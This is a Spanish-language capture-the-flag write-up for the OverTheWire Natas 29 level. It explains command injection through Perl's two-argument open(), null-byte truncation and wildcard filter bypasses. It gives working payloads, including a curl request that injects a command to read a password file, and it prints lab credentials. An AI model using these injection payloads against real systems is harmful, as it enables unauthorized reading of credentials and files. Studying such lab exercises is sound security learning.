# Natas 29 → 30

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas29.natas.labs.overthewire.org |
| Usuario | natas29 |
| Contraseña | 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns |
| Contraseña obtenida | WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH |

---

## Reconocimiento

La página presenta un menú desplegable con artículos de "Perl Underground". Al seleccionar uno, la URL contiene un parámetro `file`:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
```

La extensión `.pl` indica que el backend usa **Perl**, no PHP. El parámetro `file` carga archivos directamente — vector claro para LFI o command injection.

---

## Análisis del código fuente

```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

### Línea por línea

```perl
if(param('file')){
```
Si existe el parámetro `file` en el request.

```perl
$f=param('file');
```
Guarda el valor del parámetro en `$f`.

```perl
if($f=~/natas/){
    print "meeeeeep!<br>";
}
```
- `=~` es el operador de match con regex en Perl
- Si `$f` contiene la palabra `natas`, imprime `meeeeeep!` y bloquea
- Aquí está el filtro que impide leer `/etc/natas_webpass/natas30` directamente

```perl
else{
    open(FD, "$f.txt");
}
```
Si no contiene `natas`, abre un archivo cuyo nombre es `$f.txt`.

---

## Vulnerabilidades

### 1. `open()` de dos argumentos en Perl

La función `open()` con dos argumentos es vulnerable a **command injection**. Si el filename empieza o termina con `|`, Perl lo trata como un comando de shell en lugar de un archivo:

```perl
open(FD, "|comando")  # Ejecuta el comando
open(FD, "comando|")  # También ejecuta el comando
```

Es una característica de Perl que se convierte en vulnerabilidad cuando el input no está sanitizado.

### 2. Concatenación de `.txt` sin sanitización

El servidor agrega `.txt` al final del filename. Esto se bypasea con un **null byte** (`%00`) que trunca el string en C-style strings.

### 3. Filtro débil con regex

El filtro busca literalmente la cadena `natas`. Cualquier modificación a esa cadena lo bypasea, incluso si bash la reconstruye después al expandir wildcards.

---

## El payload

```
|cat /etc/na?as_webpass/na?as30\0
```

Componentes:
- `|` → activa command injection en `open()`
- `cat /etc/na?as_webpass/na?as30` → lee la contraseña
- `na?as` → bypasea el filtro Perl que busca `natas` literal
- `\0` (null byte) → trunca el `.txt` que se concatena al final

---

## Doble capa de bypass

El `?` funciona en dos capas distintas:

1. **Capa Perl** — el regex `/natas/` busca la cadena literal `natas`. La cadena `na?as` no coincide → pasa el filtro.

2. **Capa Bash** — cuando Perl ejecuta el comando, bash interpreta `?` como **wildcard** que coincide con cualquier carácter individual. Bash expande `na?as` a `natas` y encuentra el archivo real.

Es un bypass de doble capa: evita el filtro Perl pero funciona en bash.

---

## Explotación

```bash
curl -s 'http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na?as_webpass/na?as30%00' \
  -u natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns | grep -A5 '<pre>'
```

### Otras técnicas equivalentes

```bash
# Comillas dobles vacías
?file=|cat+/etc/na""tas_webpass/na""tas30

# Hex con xxd
?file=|cat+/etc/$(echo+6e61746173|xxd+-r+-p)_webpass/$(echo+6e61746173|xxd+-r+-p)30
```

Todas evitan la cadena literal `natas` pero terminan ejecutando el mismo comando.

---

## Conceptos clave

- **`open()` de dos argumentos en Perl**: tratada como command injection cuando el filename contiene `|`. Solución: usar `open()` de tres argumentos `open($fd, '<', $filename)`.
- **Null byte (`\0`)**: trunca strings en C. Útil para bypassear concatenaciones de extensiones (`.txt`, `.jpg`, etc.).
- **Wildcards de bash**: `?` coincide con un carácter individual, `*` con cualquier cadena. Permiten bypassear filtros que buscan substrings literales.
- **Filtros de regex débiles**: si solo buscan substrings literales sin contemplar wildcards o codificaciones, son fáciles de bypassear.
- **Bypass de doble capa**: aprovechar que diferentes capas (filtro Perl + ejecución Bash) interpretan los caracteres de forma distinta.
